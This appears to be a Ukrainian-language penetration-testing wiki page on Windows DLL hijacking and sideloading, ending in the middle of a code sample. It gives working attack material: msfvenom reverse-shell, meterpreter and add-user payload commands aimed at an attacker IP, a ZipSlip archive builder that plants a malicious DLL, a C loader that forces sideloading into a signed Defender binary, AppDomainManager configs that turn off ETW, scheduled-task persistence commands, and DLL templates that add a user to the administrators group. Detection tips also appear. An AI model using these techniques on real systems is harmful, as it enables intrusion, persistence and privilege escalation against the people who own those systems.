# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking — це маніпуляція довіреною програмою, щоб змусити її завантажити шкідливу DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection і Side-Loading**. Їх переважно використовують для виконання коду й закріплення в системі, а рідше — для підвищення привілеїв. Хоча тут основна увага приділяється підвищенню привілеїв, метод викрадення DLL залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking використовують кілька методів; ефективність кожного залежить від способу, у який програма завантажує DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: заміна справжньої DLL на шкідливу, за бажанням із використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення шкідливої DLL у шляху пошуку перед легітимною, використовуючи шаблон пошуку програми.
3. **Phantom DLL Hijacking**: створення шкідливої DLL, яку програма завантажить, вважаючи її відсутньою необхідною DLL.
4. **DLL Redirection**: зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: заміна легітимної DLL на шкідливий відповідник у каталозі WinSxS; цей метод часто пов'язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: розміщення шкідливої DLL у контрольованому користувачем каталозі разом із копією програми; цей метод нагадує техніки Binary Proxy Execution.

Програма також може використовувати **власний завантажувач DLL**. Привілейований процес може переглядати дочірній каталог, наприклад `Libraries` або `Plugins`, і передавати вибрану DLL допоміжному компоненту, незалежно від стандартного порядку пошуку DLL у Windows. Якщо інший обліковий запис може створювати файли саме в цьому каталозі, розглядайте це як привід для перевірки: з'ясуйте, під яким обліковим записом працює процес, які ефективні ACL має каталог, за яким правилом вибирається файл і чи може бути виконане завантаження. Сам факт, що каталог поруч із виконуваним файлом доступний для запису, не доводить, що процес завантажує звідти DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Класичний side-loading не змінює довірений PE, а забезпечує перемогу під час визначення DLL за іменем. **Import grafting**, натомість, змінює PE, який уже завантажила довірена програма. Зловмисник додає дескриптор імпорту та пов'язані з ним записи таблиць пошуку й IAT для контрольованої ним DLL. Коли Windows рекурсивно розв'язує цю залежність, вона відображає додану DLL і виконує її код ініціалізації в межах легітимного процесу. Це модифікація PE на диску, а не та сама операція, що й заміна вказівника на функцію в живій IAT на runtime hook.<sup>[[26]](#references)[[27]](#references)</sup>

Змінений PE може бути проміжною DLL постачальника, а не виконуваним файлом, який запускає користувач або Task Scheduler. Повторно використовуваний ланцюжок дій:<sup>[[27]](#references)</sup>

1. Скопіюйте легітимний виконуваний файл і його залежності до контрольованого зловмисником каталогу.
2. Змініть структури імпорту однієї із залежностей, щоб вони посилалися на шкідливу DLL, зберігши очікувані експорти залежності та її звичайну поведінку.
3. Налаштуйте autorun або scheduled task для запуску легітимного виконуваного файла. Завантажувач відобразить змінену залежність, а потім нову імпортовану DLL. Див. [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks), щоб переглянути завдання.
4. Не виконуйте ресурсоємні операції в `DllMain`; спостережуваний завантажувач створив робочий потік і продовжив поетапне розшифрування в ньому.

Цей сценарій відрізняється від компрометації ланцюжка постачання на боці постачальника тим, що пакет постачальника є чистим, а імпорт змінюється після встановлення. Під час аналізу перевіряйте кожен модуль у підготовленому каталозі, а не лише головний EXE: порівнюйте списки імпорту залежностей і їхні хеші з відомою справною інсталяцією, перевіряйте підписи та досліджуйте двійкові файли постачальника, запущені з неочікуваних каталогів, доступних для запису, наприклад `C:\ProgramData`. Заплановане завдання, яке вказує на скопійований засіб звітування про збої або оновлення в такому каталозі, може бути особливо корисною зачіпкою для подальшого аналізу.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **керованою** програмою, CLR також перевіряє **файл конфігурації програми**, названий відповідно до виконуваного файла (наприклад, `Setup.exe.config`). У цьому файлі можна визначити власний **AppDomainManager**. Якщо конфігурація вказує на контрольовану зловмисником збірку, розміщену поруч з EXE, CLR завантажує її **до виконання звичайного коду програми** й запускає в межах довіреного процесу.<sup>[[24]](#references)</sup>

Згідно зі схемою конфігурації .NET Framework від Microsoft, для використання власного менеджера мають бути присутні обидва елементи: `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Мінімальний менеджер:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Практичні примітки:
- Цей tradecraft стосується лише **.NET Framework**. Він залежить від розбору конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Хост має бути саме **керованим EXE**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe` або пошук **CLR Runtime Header** у метаданих PE.
- Назва конфігураційного файлу має точно збігатися з назвою виконуваного файлу (`<binary>.config`); зазвичай він розміщується **поруч із EXE**.
- Це корисно з **підписаними бінарними файлами Microsoft/постачальника**, оскільки довірений EXE залишається незмінним, а шкідлива керована збірка виконується в тому самому процесі.
- Якщо у вас уже є доступний для запису каталог інсталятора/оновлення, AppDomainManager hijacking можна використати як **перший етап**, а потім — classic DLL sideloading або reflective loading на наступних етапах.

### AppDomainManager як downloader + bootstrap для scheduled task

Практичний шаблон вторгнення — поєднати довірений керований EXE зі шкідливими `*.config` і DLL AppDomainManager, яка працює лише як **невеликий bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний .NET інсталятор або засіб оновлення з правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Суміжний файл конфігурації змушує CLR завантажити збірку зловмисника **до початку роботи логіки легітимного застосунку**.
3. Шкідливий менеджер виконує **перевірку шляху** (наприклад, продовжує роботу, лише якщо хостовий EXE запущений із `Downloads`, і дозволяє запуск другого етапу лише з `%LOCALAPPDATA%`).
4. Якщо перевірка пройдена, він завантажує справжнє корисне навантаження в доступний для запису користувачем шлях, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Підписаний хостовий EXE залишається незмінним, тому перевірка, яка хешує лише основний бінарний файл, може не виявити компрометацію.
- Проста **антианалізна перевірка на основі шляху** є поширеною: переміщення тріади ZIP/EXE/DLL на Desktop, у Temp або в каталог пісочниці може навмисно перервати ланцюжок.
- DLL AppDomainManager першого етапу може залишатися крихітною та малопомітною, тоді як справжній імплант завантажується пізніше.

Мінімальний приклад persistence, який часто трапляється в цьому шаблоні:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Примітки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує підвищення до SYSTEM.
- Цю техніку часто точніше класифікувати як **виконання/закріплення через зловживання конфігурацією .NET**, а не як класичне перехоплення порядку пошуку відсутньої DLL, хоча оператори часто поєднують обидва підходи.

Орієнтири для виявлення:
- Підписані виконувані файли .NET, запущені з каталогів розпакування **ZIP**, `Downloads`, `%TEMP%` або інших доступних для запису користувачеві папок, поруч із якими розміщено `<exe>.config`.
- Нові заплановані завдання, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а назви імітують засоби оновлення браузерів/виробників.
- Короткочасні керовані процеси-завантажувачі, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу на ранньому етапі, якщо шлях до виконуваного файла не відповідає очікуваному каталогу профілю користувача.

### Перехоплення наявного запланованого завдання для повторного запуску ланцюжка sideload

Для закріплення не варто шукати лише **створення нового завдання**. Деякі групи зловмисників чекають, доки легітимний інсталятор створить **звичайне завдання оновлення**, а потім **переписують дію завдання**, щоб наявні назва, автор і тригер залишалися звичними для захисників.

Типовий сценарій:
1. Встановіть/запустіть легітимне програмне забезпечення та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **довірений host EXE** з доступного для запису користувачем каталогу підготовки, звідки він виконує sideload або завантажує реальне корисне навантаження через AppDomain.
4. Повторно зареєструйте завдання під тією самою назвою, замість створення нового очевидного артефакту закріплення.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Чому це непомітніше:
- Назва завдання може й надалі виглядати легітимно (наприклад, як назва засобу оновлення від постачальника).
- Його запускає **служба Task Scheduler**, тому під час перевірки батьківського процесу чи предків часто видно очікуваний ланцюжок планувальника, а не `explorer.exe`.
- Команди DFIR, які шукають лише **нові назви завдань**, можуть не помітити завдання, реєстрація якого вже існувала, але дія якого тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований зловмисником.

Швидкі напрямки пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівняйте XML-файли в `C:\Windows\System32\Tasks\*` і метадані в `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з базовим знімком.
- Створюйте сповіщення, коли **завдання засобу оновлення, схоже на завдання постачальника**, запускається з **каталогів, доступних для запису користувачам**, або запускає .NET EXE із файлом `*.config` у тій самій папці.

> [!TIP]
> Покроковий ланцюжок, що поєднує HTML staging, конфігурації AES-CTR і .NET implants із DLL sideloading, описано в наведеному нижче робочому процесі.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) від sysinternals і **налаштувати** **2 наведені нижче фільтри**:

![Поширені методи — пошук відсутніх DLL: найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon від sysinternals і налаштувати 2 наведені нижче фільтри](<../../../images/image (961).png>)

![Поширені методи — пошук відсутніх DLL: найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon від sysinternals і налаштувати 2 наведені нижче фільтри](<../../../images/image (230).png>)

і показати лише **File System Activity**:

![Поширені методи — пошук відсутніх DLL: і показати лише File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL загалом**, **залиште** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у певному виконуваному файлі**, додайте ще один фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть файл і зупиніть збір подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, шукайте **DLL, яку привілейований процес намагається завантажити** з місця, доступного вам для запису. Таке може статися, якщо ви контролюєте каталог, який перевіряється раніше за каталог із легітимною DLL, або якщо запитувана DLL не існує, а ви можете записувати в один із каталогів, що перевіряються.

### Порядок пошуку DLL

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **описано, як саме завантажуються DLL.**

**Програми Windows** шукають DLL за **заздалегідь визначеним набором шляхів**, дотримуючись певної послідовності. DLL hijacking стається, коли шкідливу DLL стратегічно розміщують в одному з цих каталогів, щоб її було завантажено раніше за справжню DLL. Щоб запобігти цьому, програма має використовувати абсолютні шляхи для DLL, які їй потрібні.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Щоб отримати шлях до нього, скористайтеся функцією [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-бітний системний каталог. Функції для отримання шляху до цього каталогу немає, але система його перевіряє. (_C:\Windows\System_)
4. Каталог Windows. Щоб отримати шлях до нього, скористайтеся функцією [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу: сюди не входить шлях для окремої програми, заданий у розділі реєстру **App Paths**. Ключ **App Paths** не використовується для обчислення шляху пошуку DLL.

Це **стандартний** порядок пошуку, коли **SafeDllSearchMode** увімкнено. Якщо цей режим вимкнено, поточний каталог переміщується на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням режим увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукає саму DLL лише за цим шляхом; залежності, запитані за назвою, і далі шукаються відповідно до застосовного порядку пошуку.

Є й інші способи змінити порядок пошуку, але я не описуватиму їх тут.

### Перетворення довільного запису файлу на hijack відсутньої DLL

**Пов’язана техніка:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. За допомогою фільтрів **ProcMon** (`Process Name` = цільовий EXE, `Path` закінчується на `.dll`, `Result` = `NAME NOT FOUND`) зберіть назви DLL, які процес шукає, але не знаходить.<sup>[[14]](#references)</sup>
2. Якщо бінарний файл запускається **за розкладом або як служба**, DLL із такою назвою, розміщена в **каталозі програми** (позиція №1 у порядку пошуку), завантажиться під час наступного запуску. В одному випадку зі сканером .NET процес шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким експортом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш примітив — **довільний запис у стилі ZipSlip**, створіть ZIP, запис якого виходить за межі каталогу розпакування, щоб DLL опинилася в каталозі програми:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Доставте архів до контрольованої папки вхідних файлів/спільної папки; коли заплановане завдання повторно запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано впливати на шлях пошуку DLL нового процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Якщо вказати тут контрольований зловмисником каталог, цільовий процес, який шукає імпортовану DLL за назвою (без абсолютного шляху та без безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цього каталогу.

Основна ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що веде до контрольованої вами папки (наприклад, каталогу, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл шукатиме DLL за назвою, завантажувач перевірить указаний DllPath під час пошуку, що дасть змогу надійно виконати sideloading, навіть якщо шкідлива DLL розташована не поруч із цільовим EXE.

Примітки/обмеження
- Це впливає на дочірній процес, що створюється; це відрізняється від SetDllDirectory, який впливає лише на поточний процес.
- Цільовий процес має імпортувати DLL або викликати LoadLibrary за назвою (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо перехопити. Експортовані функції-перенаправлення та SxS можуть змінити пріоритет пошуку.

Мінімальний приклад на C (ntdll, широкі рядки, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Приклад використання
- Помістіть шкідливий xmllite.dll (експортує потрібні функції або проксіює виклики до справжньої DLL) у каталог DllPath.
- Запустіть підписаний бінарний файл, який, як відомо, шукає xmllite.dll за назвою, використовуючи описану вище техніку. Завантажувач знаходить імпорт через заданий DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали в реальних атаках, де її використовували для побудови багатоступеневих ланцюжків sideloading: початковий завантажувач скидає допоміжну DLL, яка потім запускає підписаний Microsoft бінарний файл, вразливий до hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника з проміжного каталогу.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking через `.exe.config`

Для цілей на **.NET Framework** sideloading можна виконати **до `Main()`** без модифікації пам’яті, зловживаючи суміжним файлом **`.exe.config`** програми. Замість того щоб покладатися лише на порядок пошуку DLL у Win32, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим файлом конфігурації та однією чи кількома контрольованими зловмисником збірками.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Запускається EXE-файл хоста, і **CLR читає `<exe>.config`**.
2. Конфігурація задає **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб середовище виконання створило контрольований зловмисником `AppDomainManager`.
3. Шкідливий менеджер отримує можливість виконати код **до `Main()`** усередині довіреного процесу хоста.
4. Та сама конфігурація може змусити CLR спочатку шукати локальні збірки (наприклад, InitInstall.dll, Updater.dll, uevmonitor.dll), а також послабити перевірку середовища виконання й телеметрію без inline-патчингу.

Схема, типова для кампаній (точна вкладеність може відрізнятися залежно від директиви / версії CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Чому це корисно:
- **`<probing privatePath="."/>`** обмежує пошук збірок каталогом програми, перетворюючи цю папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** передають виконання коду зловмисника під час ініціалізації CLR, до запуску логіки легітимної програми.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити програмі з повним рівнем довіри завантажувати непідписані або змінені збірки без помилки перевірки strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленню політикою видавця на новіші збірки.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір середовища виконання більш передбачуваним.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікава, оскільки **CLR вимикає власну видимість через ETW** за допомогою конфігурації, а не патчить `EtwEventWrite` у пам’яті імпланта.

Операційна схема, яку спостерігали в нещодавніх кампаніях:
- Етап 1: розміщуються `setup.exe`, `setup.exe.config` і локальні збірки.
- Етап 2: їх копіюють у правдоподібну папку **AppData update**, перейменовують хост на щось на кшталт `update.exe` і повторно запускають його через **заплановане завдання**.
- Етап 3: перевіряють контекст виконання (наприклад, очікуваний батьківський процес `svchost.exe` від Task Scheduler), перш ніж завантажити фінальну RAT DLL/експорт.

Ідеї для пошуку:
- Підписані або інші легітимні **виконувані файли .NET**, які запускаються з підозрілими суміжними файлами **`.config`** у каталогах, доступних для запису користувачам.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Заплановані завдання, які повторно запускають перейменовані бінарні файли оновлення з **`%LOCALAPPDATA%`** або каталогів програми на кшталт `\bin\update\`.
- Ланцюжки батьківських і дочірніх процесів, у яких заплановане завдання запускає довірений хост .NET, що одразу завантажує збірки не від постачальника з власного каталогу.

#### Винятки з порядку пошуку DLL згідно з документацією Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Якщо виявлено **DLL з такою самою назвою, як у вже завантаженої в пам’ять**, система оминає звичайний пошук. Натомість вона перевіряє наявність перенаправлення та маніфесту, а потім за замовчуванням використовує DLL, уже завантажену в пам’ять. **У цьому випадку система не шукає DLL**.
- Якщо DLL розпізнано як **відому DLL** для поточної версії Windows, система використовує свою версію відомої DLL разом із будь-якими залежними DLL, **не виконуючи пошук**. У розділі реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** міститься список цих відомих DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише за своїми **іменами модулів**, незалежно від того, чи було початкову DLL виявлено за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Визначити процес, який працює або працюватиме з **іншими привілеями** (горизонтальне або латеральне переміщення) і **не має DLL**.
- Переконатися, що є **доступ для запису** до будь-якого **каталогу**, у якому шукатимуть **DLL**. Це може бути каталог виконуваного файла або каталог у системному шляху.

За замовчуванням такі передумови трапляються нечасто: привілейованим виконуваним файлам зазвичай не бракує залежностей DLL, а звичайні користувачі зазвичай не можуть записувати в каталоги системного шляху пошуку. Однак неправильно налаштовані середовища можуть створити обидві умови.\
Якщо вимоги виконано, перегляньте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — обхід UAC, він містить PoC для DLL hijacking у певних версіях Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що **перевірити дозволи на папку** можна так:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

І **перевірте дозволи всіх папок у PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Також можна перевірити імпорти виконуваного файла та експорти DLL за допомогою:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника про те, як **зловживати DLL Hijacking для підвищення привілеїв**, маючи права на запис у **папку System Path**, дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви права на запис у будь-яку папку в системному PATH.\
Інші корисні автоматизовані інструменти для виявлення цієї вразливості — це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви знайдете сценарій, який можна експлуатувати, однією з найважливіших умов успішної експлуатації буде **створити dll, яка експортує принаймні всі функції, які виконуваний файл імпортуватиме з неї**. У будь-якому разі, зауважте, що DLL Hijacking корисний для [підвищення рівня цілісності з Medium до High **(в обхід UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад **створення коректної dll** можна знайти в цьому дослідженні DLL hijacking, присвяченому DLL hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете **базові коди dll**, які можуть стати в пригоді як **шаблони** або для створення **dll з експортованими непотрібними функціями**.

## **Створення та компіляція DLL**

### **Проксіювання DLL**

По суті, **проксі DLL** — це DLL, здатна **виконати ваш шкідливий код під час завантаження**, а також **експортувати функції** й **працювати** так, як **очікується**, **переспрямовуючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна **вказати виконуваний файл і вибрати бібліотеку** для проксіювання, а потім **створити проксі dll**, або **вказати DLL** і **створити проксі dll**.

### **Meterpreter**

**Отримання зворотної оболонки (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримайте meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створіть користувача (x86; версії для x64 я не бачив):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Власна DLL

У багатьох випадках скомпільована вами DLL має **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо потрібного експорту немає, бінарний файл не зможе її знайти, і експлойт не спрацює.

<details>
<summary>Шаблон DLL на C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
